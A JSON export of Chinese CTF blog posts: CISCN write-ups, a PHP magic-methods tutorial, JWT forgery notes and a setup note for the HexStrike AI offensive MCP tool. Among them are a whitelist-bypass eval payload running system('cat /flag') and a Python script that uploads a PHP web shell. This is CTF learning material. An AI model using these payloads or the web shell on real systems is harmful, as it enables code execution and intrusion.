{"posts":[{"title":"","text":"CISCN2019 华东南赛区–Double Secret 提示了一个secret进入secret页面继续提示了，意思是 告诉我你的秘密。我会加密它，这样其他人就看不到了。 然后传一个secret参数?secret=1 这里明显应该是加密了多传几位试试得到如下报错","link":"/2025/12/11/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA--Double%20Secret/"},{"title":"","text":"CISCN 2019 初赛–Love Math 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c'])){ show_source(__FILE__);}else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(&quot;太长了不会算&quot;); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(&quot;请不要输入奇奇怪怪的字符&quot;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(&quot;请不要输入奇奇怪怪的函数&quot;); } } //帮你算出答案 eval('echo '.$content.';');} payload：/?c=19-1 可以执行这里黑名单过滤了不少东西，常规的cat/flag都用不了，这里有个知识点是php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码执行 12$a='system';$a('cat/flag'); 这里使用的传参是 1?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag 但是这里的_GET和a，b都不是白名单里面的，这里需要替换替换之后 1?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag 但是这里的_GET是无法进行直接替换，而且[]也被黑名单过滤了这里就需要去了解一下他给的白名单里面的函数了这里说一下需要用到的几个函数这里先将_GET来进行转换的函数 hex2bin() 函数hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。 这里的_GET是ASCII 字符，用在线工具将_GET转换为十六进制hex2bin(5f 47 45 54) 就是 _GET,但是hex2bin()函数也不是白名单里面的，而且这里的5f 47 45 54也不能直接填入，这里会被 1preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); 来进行白名单的检测。这里的hex2bin()函数可以通过base_convert()函数来进行转换base_convert()函数能够在任意进制之间转换数字这里的hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin 1234567&lt;?php $pi=base_convert(37907361743, 10, 36); echo $pi; echo &quot;\\n&quot;; $PI=base_convert('hex2bin', 36, 10); echo $PI; ?&gt; 输出结果 12hex2bin37907361743 123然后里面的5f 47 45 54要用dechex()函数将10进制数转换为16进制的数dechex(1598506324)，1598506324转换为16进制就是5f 47 45 54 来进行白名单的检测。这里的hex2bin()函数可以通过base_convert()函数来进行转换base_convert()函数能够在任意进制之间转换数字这里的hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin hex2bin=base_convert(37907361743,10,36)然后里面的5f 47 45 54要用dechex()函数将10进制数转换为16进制的数dechex(1598506324)，1598506324转换为16进制就是5f 47 45 54最终的payload： 1/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag","link":"/2025/12/11/CISCN%202019%20%E5%88%9D%E8%B5%9B--Love%20Math/"},{"title":"","text":"CISCN2019 华北赛区 Day1 Web1–Dropbox 先注册一个admin发现可以传文件测试了一下只能传图片这里我们就传一个图片上去发现可以下载然后发现filename可以传参 直接下载得到index.php读取出来这些个源码然后我们全下载下来","link":"/2025/12/11/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1--Dropbox/"},{"title":"","text":"CISCN2019 华北赛区 Day2 Web1–Hack World 你想要的一切都在 “flag” 表中，而该列是 “flag”现在，只需给出通道的 ID 即可。 1和2都有返回结果","link":"/2025/12/11/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1--Hack%20World/"},{"title":"","text":"hexstrike-ai kali作为服务端，Windows作为客户端kali的IP：192.168.1.101 启动hexstrlike-ai 12345cd /home/challenge/Desktop/hexstrike-aisource venv/bin/activatepython3 hexstrike_server.py 客户端启动 1python hexstrike_mcp.py --server http://192.168.1.101:8888 --debug trae的mcp配置文件 123456789101112131415{ &quot;mcpServers&quot;: { &quot;hexstrike-ai&quot;: { &quot;command&quot;: &quot;D:\\\\env\\\\Python\\\\Python313\\\\python.exe&quot;, &quot;args&quot;: [ &quot;D:\\\\hexstrike-ai\\\\hexstrike_mcp.py&quot;, &quot;--server&quot;, &quot;http://192.168.1.101:8888&quot; ], &quot;description&quot;: &quot;HexStrike AI v6.0 - Advanced Cybersecurity Automation Platform&quot;, &quot;timeout&quot;: 300, &quot;disabled&quot;: false } }} MCP调试工具启动，这个默认启动最新版本 1npx @modelcontextprotocol/inspector 点链接进入浏览器 如下所示 Command 1D:\\env\\Python\\Python313\\python.exe Arguments 1D:\\\\hexstrike-ai\\\\hexstrike_mcp.py --server http://192.168.1.101:8888 然后就可以用这个页面去微调MCP了像一些什么提示词之类的","link":"/2025/12/11/hexstrlike-ai/"},{"title":"","text":"PHP魔术方法 前言PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括： __construct()，类的构造函数 __destruct()，类的析构函数 __call()，在对象中调用一个不可访问方法时调用 __callStatic()，用静态方式中调用一个不可访问方法时调用 __get()，获得一个类的成员变量时调用 __set()，设置一个类的成员变量时调用 __isset()，当对不可访问属性调用isset()或empty()时调用 __unset()，当对不可访问属性调用unset()时被调用。 __sleep()，执行serialize()时，先会调用这个函数 __wakeup()，执行unserialize()时，先会调用这个函数 __toString()，类被当成字符串时的回应方法 __invoke()，调用函数的方式调用一个对象时的回应方法 __set_state()，调用var_export()导出类时，此静态方法会被调用。 __clone()，当对象复制完成时调用 __autoload()，尝试加载未定义的类 __debugInfo()，打印所需调试信息 范例下面让我们以实例的形式向大家讲解下这几个魔术方法时如何使用的。 一、 __construct()，类的构造函数php中构造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。 1、 构造方法的作用 通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。 2、 构造方法的在类中的声明格式 1234function __constrct([参数列表]){ 方法体 //通常用来对成员属性进行初始化赋值} 3、 在类中声明构造方法需要注意的事项 1231、在同一个类中只能声明一个构造方法，原因是，PHP不支持构造函数重载。2、构造方法名称是以两个下画线开始的__construct() 下面是它的例子： 1234567891011121314151617181920212223242526&lt;?php class Person { public $name; public $age; public $sex; /** * 显示声明一个构造方法且带参数 */ public function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=27) { $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; } /** * say 方法 */ public function say() { echo &quot;我叫：&quot; . $this-&gt;name . &quot;，性别：&quot; . $this-&gt;sex . &quot;，年龄：&quot; . $this-&gt;age; } } 创建对象$Person1且不带任参数 12$Person1 = new Person();echo $Person1-&gt;say(); //输出:我叫：，性别：男，年龄：27 创建对象$Person2且带参数“小明” 12$Person2 = new Person(&quot;小明&quot;);echo $Person2-&gt;say(); //输出：我叫：张三，性别：男，年龄：27 创建对象$Person3且带三个参数 12$Person3 = new Person(&quot;李四&quot;,&quot;男&quot;,25);echo $Person3-&gt;say(); //输出：我叫：李四，性别：男，年龄：25 二、__destruct()，类的析构函数通过上面的讲解，现在我们已经知道了什么叫构造方法。那么与构造方法对应的就是析构方法。 析构方法允许在销毁一个类之前执行的一些操作或完成一些功能，比如说关闭文件、释放结果集等。 析构方法是PHP5才引进的新内容。 析造方法的声明格式与构造方法 __construct() 比较类似，也是以两个下划线开始的方法 __destruct() ，这种析构方法名称也是固定的。 1、 析构方法的声明格式 1234function __destruct(){ //方法体} 注意：析构函数不能带有任何参数。 2、 析构方法的作用 1一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。 举例演示，如下： 123456789101112131415161718192021222324252627282930313233&lt;?phpclass Person{ public $name; public $age; public $sex; public function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=22) { $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; } /** * say 说话方法 */ public function say() { echo &quot;我叫：&quot;.$this-&gt;name.&quot;，性别：&quot;.$this-&gt;sex.&quot;，年龄：&quot;.$this-&gt;age; } /** * 声明一个析构方法 */ public function __destruct() { echo &quot;我觉得我还可以再抢救一下，我的名字叫&quot;.$this-&gt;name; }}$Person = new Person(&quot;小明&quot;);unset($Person); //销毁上面创建的对象$Person 上面的程序运行时输出： 1我觉得我还可以再抢救一下，我的名字叫小明 三、 __call()，在对象中调用一个不可访问方法时调用。该方法有两个参数，第一个参数 $function_name 会自动接收不存在的方法名，第二个 $arguments 则以数组的方式接收不存在方法的多个参数。 1、 __call() 方法的格式： 1234function __call(string $function_name, array $arguments){ // 方法体} 2、 __call() 方法的作用： 123为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。 请参考如下代码： 1234567891011121314151617181920212223&lt;?phpclass Person{ function say() { echo &quot;Hello, world!&lt;br&gt;&quot;; } /** * 声明此方法用来处理调用对象中不存在的方法 */ function __call($funName, $arguments) { echo &quot;你所调用的函数：&quot; . $funName . &quot;(参数：&quot; ; // 输出调用不存在的方法名 print_r($arguments); // 输出调用不存在的方法时的参数列表 echo &quot;)不存在！&lt;br&gt;\\n&quot;; // 结束换行 } }$Person = new Person(); $Person-&gt;run(&quot;teacher&quot;); // 调用对象中不存在的方法，则自动调用了对象中的__call()方法$Person-&gt;eat(&quot;小明&quot;, &quot;苹果&quot;); $Person-&gt;say(); 运行结果： 12345你所调用的函数：run(参数：Array ( [0] =&gt; teacher ) )不存在！你所调用的函数：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！Hello, world! 四、 __callStatic()，用静态方式中调用一个不可访问方法时调用此方法与上面所说的 __call() 功能除了 __callStatic() 是未静态方法准备的之外，其它都是一样的。 请看下面代码： 1234567891011121314151617181920212223&lt;?phpclass Person{ function say() { echo &quot;Hello, world!&lt;br&gt;&quot;; } /** * 声明此方法用来处理调用对象中不存在的方法 */ public static function __callStatic($funName, $arguments) { echo &quot;你所调用的静态方法：&quot; . $funName . &quot;(参数：&quot; ; // 输出调用不存在的方法名 print_r($arguments); // 输出调用不存在的方法时的参数列表 echo &quot;)不存在！&lt;br&gt;\\n&quot;; // 结束换行 }}$Person = new Person();$Person::run(&quot;teacher&quot;); // 调用对象中不存在的方法，则自动调用了对象中的__call()方法$Person::eat(&quot;小明&quot;, &quot;苹果&quot;);$Person-&gt;say(); 运行结果如下： 123你所调用的静态方法：run(参数：Array ( [0] =&gt; teacher ) )不存在！你所调用的静态方法：eat(参数：Array ( [0] =&gt; 小明 [1] =&gt; 苹果 ) )不存在！Hello, world! 五、 __get()，获得一个类的成员变量时调用在 php 面向对象编程中，类的成员属性被设定为 private 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误。那么为了解决这个问题，我们可以使用魔术方法 __get()。 魔术方法__get()的作用 1在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。 我们通过下面的 __get() 的实例来更进一步的连接它吧： 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass Person{ private $name; private $age; function __construct($name=&quot;&quot;, $age=1) { $this-&gt;name = $name; $this-&gt;age = $age; } /** * 在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理 * @param $propertyName * * @return int */ public function __get($propertyName) { if ($propertyName == &quot;age&quot;) { if ($this-&gt;age &gt; 30) { return $this-&gt;age - 10; } else { return $this-&gt;$propertyName; } } else { return $this-&gt;$propertyName; } }}$Person = new Person(&quot;小明&quot;, 60); // 通过Person类实例化的对象，并通过构造方法为属性赋初值echo &quot;姓名：&quot; . $Person-&gt;name . &quot;&lt;br&gt;&quot;; // 直接访问私有属性name，自动调用了__get()方法可以间接获取echo &quot;年龄：&quot; . $Person-&gt;age . &quot;&lt;br&gt;&quot;; // 自动调用了__get()方法，根据对象本身的情况会返回不同的值 运行结果： 12姓名：小明年龄：50 六、 __set()，设置一个类的成员变量时调用 __set() 的作用： __set( value )` 方法用来设置私有属性， 给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值。 请看下面的演示代码： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass Person{ private $name; private $age; public function __construct($name=&quot;&quot;, $age=25) { $this-&gt;name = $name; $this-&gt;age = $age; } /** * 声明魔术方法需要两个参数，真接为私有属性赋值时自动调用，并可以屏蔽一些非法赋值 * @param $property * @param $value */ public function __set($property, $value) { if ($property==&quot;age&quot;) { if ($value &gt; 150 || $value &lt; 0) { return; } } $this-&gt;$property = $value; } /** * 在类中声明说话的方法，将所有的私有属性说出 */ public function say(){ echo &quot;我叫&quot;.$this-&gt;name.&quot;，今年&quot;.$this-&gt;age.&quot;岁了&quot;; }}$Person=new Person(&quot;小明&quot;, 25); //注意，初始值将被下面所改变//自动调用了__set()函数，将属性名name传给第一个参数，将属性值”李四”传给第二个参数$Person-&gt;name = &quot;小红&quot;; //赋值成功。如果没有__set()，则出错。//自动调用了__set()函数，将属性名age传给第一个参数，将属性值26传给第二个参数$Person-&gt;age = 16; //赋值成功$Person-&gt;age = 160; //160是一个非法值，赋值失效$Person-&gt;say(); //输出：我叫小红，今年16岁了 运行结果： 1我叫小红，今年16岁了 七、 __isset()，当对不可访问属性调用isset()或empty()时调用在看这个方法之前我们看一下isset()函数的应用，isset()是测定变量是否设定用的函数，传入一个变量作为参数，如果传入的变量存在则传回true，否则传回false。 那么如果在一个对象外面使用isset()这个函数去测定对象里面的成员是否被设定可不可以用它呢？ 分两种情况，如果对象里面成员是公有的，我们就可以使用这个函数来测定成员属性，如果是私有的成员属性，这个函数就不起作用了，原因就是因为私有的被封装了，在外部不可见。那么我们就不可以在对象的外部使用isset()函数来测定私有成员属性是否被设定了呢？当然是可以的，但不是一成不变。你只要在类里面加上一个__isset()方法就可以了，当在类外部使用isset()函数来测定对象里面的私有成员是否被设定时，就会自动调用类里面的__isset()方法了帮我们完成这样的操作。 __isset()的作用：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。 请看下面代码演示： 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; private $name; private $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @param $content * * @return bool */ public function __isset($content) { echo &quot;当在类外部使用isset()函数测定私有成员{$content}时，自动调用&lt;br&gt;&quot;; echo isset($this-&gt;$content); }}$person = new Person(&quot;小明&quot;, 25); // 初始赋值echo isset($person-&gt;sex),&quot;&lt;br&gt;&quot;;echo isset($person-&gt;name),&quot;&lt;br&gt;&quot;;echo isset($person-&gt;age),&quot;&lt;br&gt;&quot;; 运行结果如下： 123451 // public 可以 isset()当在类外部使用isset()函数测定私有成员name时，自动调用 // __isset() 内 第一个echo1 // __isset() 内第二个echo当在类外部使用isset()函数测定私有成员age时，自动调用 // __isset() 内 第一个echo1 // __isset() 内第二个echo 八、 __unset()，当对不可访问属性调用unset()时被调用。看这个方法之前呢，我们也先来看一下 unset() 函数，unset()这个函数的作用是删除指定的变量且传回true，参数为要删除的变量。 那么如果在一个对象外部去删除对象内部的成员属性用unset()函数可以吗？ 这里自然也是分两种情况： 1、 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。 2、 如果对象的成员属性是私有的，我使用这个函数就没有权限去删除。 虽然有以上两种情况，但我想说的是同样如果你在一个对象里面加上__unset()这个方法，就可以在对象的外部去删除对象的私有成员属性了。在对象里面加上了__unset()这个方法之后，在对象外部使用“unset()”函数删除对象内部的私有成员属性时，对象会自动调用__unset()函数来帮我们删除对象内部的私有成员属性。 请看如下代码： 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; private $name; private $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @param $content * * @return bool */ public function __unset($content) { echo &quot;当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;&quot;; echo isset($this-&gt;$content); }}$person = new Person(&quot;小明&quot;, 25); // 初始赋值unset($person-&gt;sex);unset($person-&gt;name);unset($person-&gt;age); 运行结果： 123当在类外部使用unset()函数来删除私有成员时自动调用的1当在类外部使用unset()函数来删除私有成员时自动调用的1 九、 __sleep()，执行serialize()时，先会调用这个函数serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。 此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。 如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 注意： 1__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。 作用： 1__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。 具体请参考如下代码： 123456789101112131415161718192021222324252627&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @return array */ public function __sleep() { echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;; $this-&gt;name = base64_encode($this-&gt;name); return array('name', 'age'); // 这里必须返回一个数值，里边的元素表示返回的属性名称 }}$person = new Person('小明'); // 初始赋值echo serialize($person);echo '&lt;br/&gt;'; 代码运行结果： 12当在类外部使用serialize()时会调用这里的__sleep()方法O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;} 十、 __wakeup()，执行unserialize()时，先会调用这个函数如果说 __sleep() 是白的，那么 __wakeup() 就是黑的了。 那么为什么呢？ 因为： 1与之相反，`unserialize()` 会检查是否存在一个 `__wakeup()` 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。 作用： 1__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。 还是看代码： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @return array */ public function __sleep() { echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;; $this-&gt;name = base64_encode($this-&gt;name); return array('name', 'age'); // 这里必须返回一个数值，里边的元素表示返回的属性名称 } /** * __wakeup */ public function __wakeup() { echo &quot;当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;&quot;; $this-&gt;name = 2; $this-&gt;sex = '男'; // 这里不需要返回数组 }}$person = new Person('小明'); // 初始赋值var_dump(serialize($person));var_dump(unserialize(serialize($person))); 运行结果： 1234当在类外部使用serialize()时会调用这里的__sleep()方法string(58) &quot;O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;}&quot; 当在类外部使用serialize()时会调用这里的__sleep()方法当在类外部使用unserialize()时会调用这里的__wakeup()方法object(Person)#2 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; int(2) [&quot;age&quot;]=&gt; int(25) } 十一、 __toString()，类被当成字符串时的回应方法作用： 1__toString() 方法用于一个类被当成字符串时应怎样回应。例如 `echo $obj;` 应该显示些什么。 注意： 1此方法必须返回一个字符串，否则将发出一条 `E_RECOVERABLE_ERROR` 级别的致命错误。 警告： 1不能在 __toString() 方法中抛出异常。这么做会导致致命错误。 代码： 12345678910111213141516171819202122&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __toString() { return 'go go go'; }}$person = new Person('小明'); // 初始赋值echo $person; 结果： 1go go go 那么如果类中没有 __toString() 这个魔术方法运行会发生什么呢？让我们来测试下： 代码： 123456789101112131415161718&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } }$person = new Person('小明'); // 初始赋值echo $person; 结果： 1Catchable fatal error: Object of class Person could not be converted to string in D:\\phpStudy\\WWW\\test\\index.php on line 18 很明显，页面报了一个致命错误，这是语法所不允许的。 十二、 __invoke()，调用函数的方式调用一个对象时的回应方法作用： 1当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 注意： 1本特性只在 PHP 5.3.0 及以上版本有效。 直接上代码： 12345678910111213141516171819202122&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __invoke() { echo '这可是一个对象哦'; }}$person = new Person('小明'); // 初始赋值$person(); 查看运行结果： 1这可是一个对象哦 当然，如果你执意要将对象当函数方法使用，那么会得到下面结果： 1Fatal error: Function name must be a string in D:\\phpStudy\\WWW\\test\\index.php on line 18 十三、 __set_state()，调用var_export()导出类时，此静态方法会被调用。作用： 1自 PHP 5.1.0 起，当调用 var_export() 导出类时，此静态方法会被自动调用。 参数： 1本方法的唯一参数是一个数组，其中包含按 array('property' =&gt; value, ...) 格式排列的类属性。 下面我们先来看看在没有加 __set_state() 情况按下，代码及运行结果如何： 上代码： 123456789101112131415161718&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; }}$person = new Person('小明'); // 初始赋值var_export($person); 看结果： 1Person::__set_state(array( 'sex' =&gt; '男', 'name' =&gt; '小明', 'age' =&gt; 25, )) 很明显，将对象中的属性都打印出来了 加了 __set_state() 之后： 继续上代码： 1234567891011121314151617181920212223242526&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public static function __set_state($an_array) { $a = new Person(); $a-&gt;name = $an_array['name']; return $a; }}$person = new Person('小明'); // 初始赋值$person-&gt;name = '小红';var_export($person); 继续看结果： 1Person::__set_state(array( 'sex' =&gt; '男', 'name' =&gt; '小红', 'age' =&gt; 25, )) 十四、 __clone()，当对象复制完成时调用在多数情况下，我们并不需要完全复制一个对象来获得其中属性。但有一个情况下确实需要：如果你有一个 GTK 窗口对象，该对象持有窗口相关的资源。你可能会想复制一个新的窗口，保持所有属性与原来的窗口相同，但必须是一个新的对象（因为如果不是新的对象，那么一个窗口中的改变就会影响到另一个窗口）。还有一种情况：如果对象 A 中保存着对象 B 的引用，当你复制对象 A 时，你想其中使用的对象不再是对象 B 而是 B 的一个副本，那么你必须得到对象 A 的一个副本。 作用： 1对象复制可以通过 clone 关键字来完成（如果可能，这将调用对象的 __clone() 方法）。对象中的 __clone() 方法不能被直接调用。 语法： 1$copy_of_object = clone $object; 注意： 123当对象被复制后，PHP 5 会对对象的所有属性执行一个浅复制（shallow copy）。所有的引用属性 仍然会是一个指向原来的变量的引用。当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用，可用于修改属性的值（如果有必要的话）。 看代码： 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __clone() { echo __METHOD__.&quot;你正在克隆对象&lt;br&gt;&quot;; }}$person = new Person('小明'); // 初始赋值$person2 = clone $person;var_dump('persion1:');var_dump($person);echo '&lt;br&gt;';var_dump('persion2:');var_dump($person2); 看结果： 123Person::__clone你正在克隆对象string(9) &quot;persion1:&quot; object(Person)#1 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; string(6) &quot;小明&quot; [&quot;age&quot;]=&gt; int(25) } string(9) &quot;persion2:&quot; object(Person)#2 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; string(6) &quot;小明&quot; [&quot;age&quot;]=&gt; int(25) } 克隆成功。 十五、__autoload()，尝试加载未定义的类作用： 1你可以通过定义这个函数来启用类的自动加载。 在魔术函数 __autoload() 方法出现以前，如果你要在一个程序文件中实例化100个对象，那么你必须用include或者require包含进来100个类文件，或者你把这100个类定义在同一个类文件中 —— 相信这个文件一定会非常大，然后你就痛苦了。 但是有了 __autoload() 方法，以后就不必为此大伤脑筋了，这个类会在你实例化对象之前自动加载制定的文件。 还是通过例子来看看吧： 先看看以往的方式： 123456789101112131415161718/** * 文件non_autoload.php */ require_once('project/class/A.php'); require_once('project/class/B.php'); require_once('project/class/C.php'); if (条件A) { $a = new A(); $b = new B(); $c = new C(); // … 业务逻辑 } else if (条件B) { $a = newA(); $b = new B(); // … 业务逻辑 } 看到了吗？不用100个，只是3个看起来就有点烦了。而且这样就会有一个问题：如果脚本执行“条件B”这个分支时，C.php这个文件其实没有必要包含。因为，任何一个被包含的文件，无论是否使用，均会被php引擎编译。如果不使用，却被编译，这样可以被视作一种资源浪费。更进一步，如果C.php包含了D.php，D.php包含了E.php。并且大部分情况都执行“条件B”分支，那么就会浪费一部分资源去编译C.php,D.php,E.php三个“无用”的文件。 那么如果使用 __autoload() 方式呢？ 1234567891011121314151617181920/** * 文件autoload_demo.php */ function __autoload($className) { $filePath = “project/class/{$className}.php”; if (is_readable($filePath)) { require($filePath); } } if (条件A) { $a = new A(); $b = new B(); $c = new C(); // … 业务逻辑 } else if (条件B) { $a = newA(); $b = new B(); // … 业务逻辑 } ok,不论效率怎么用，最起码界面看起来舒服多了，没有太多冗余的代。 再来看看这里的效率如何，我们分析下： 当php引擎第一次使用类A，但是找不到时，会自动调用 __autoload 方法，并将类名“A”作为参数传入。所以，我们在 __autoload() 中需要的做的就是根据类名，找到相应的文件，并包含进来，如果我们的方法也找不到，那么php引擎就会报错了。 注意： 1这里可以只用require，因为一旦包含进来后，php引擎再遇到类A时，将不会调用__autoload，而是直接使用内存中的类A，不会导致多次包含。 扩展： 1其实php发展到今天，已经有将 `spl_autoload_register` — 注册给定的函数作为 __autoload 的实现了，但是这个不在啊本文讲解之内，有兴趣可以自行看手册。 十六、__debugInfo()，打印所需调试信息注意： 1该方法在PHP 5.6.0及其以上版本才可以用，如果你发现使用无效或者报错，请查看啊你的版本。 看代码： 12345678910111213141516171819&lt;?phpclass C { private $prop; public function __construct($val) { $this-&gt;prop = $val; } /** * @return array */ public function __debugInfo() { return [ 'propSquared' =&gt; $this-&gt;prop ** 2, ]; }}var_dump(new C(42)); 结果： 1object(C)#1 (1) { [&quot;propSquared&quot;]=&gt; int(1764) } 再次注意： 1这里的 `**` 是乘方的意思，也是在PHP5.6.0及其以上才可以使用，详情请查看PHP手册","link":"/2025/12/11/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"title":"","text":"CISCN2021 Quals–upload 123456import requestsimport iotarget = &quot;http://d33bd228-368f-4581-93d1-9d54451a30bf.node3.buuoj.cn/&quot;headers = { &quot;Content-Range&quot;: &quot;bytes 0-1023/1070&quot; }files = {&quot;files[]&quot;: (&quot;tyskill.php&quot;, io.BytesIO(b&quot;&lt;?php echo('PWN!!');system($_GET[cmd]);?&gt;&quot;), &quot;image/png&quot;)}requests.post(url=target, files=files, headers=headers)","link":"/2025/12/11/CISCN2021%20Quals--upload/"},{"title":"","text":"JWT 攻击 JWT，常用三种手法：未校验签名、禁用哈希、暴破弱密钥。 未校验签名： 某些服务端并未校验 JWT 签名，所以，尝试修改 token 后直接发给服务端，查看结果。于是，将 user 字段值从 admin123 改为 admin 后，重新生成新 token：jwt在线解密/加密 - JSON中文网 直接把username改成admin再去编码发现500错误 继续下一个攻击 禁用哈希。JWT 第一部分含有 alg 字段，该字段指定生成签名采用哪种哈希算法，该站使用的是 HS256，可将该字段篡改为none，某些 JWT 的实现，一旦发现 alg 为 none，将不再生成哈希签名，自然不存在校验签名一说 https://jwt.io/#debugger将 alg 为 none 视为恶意行为，所以，无法通过在线工具生成 JWT： 所以直接使用 python的 pyjwt库 用 none 算法生成的 JWT 只有两部分了，根本连签名都没生成。将新的 token 发给服务端 依旧500错误 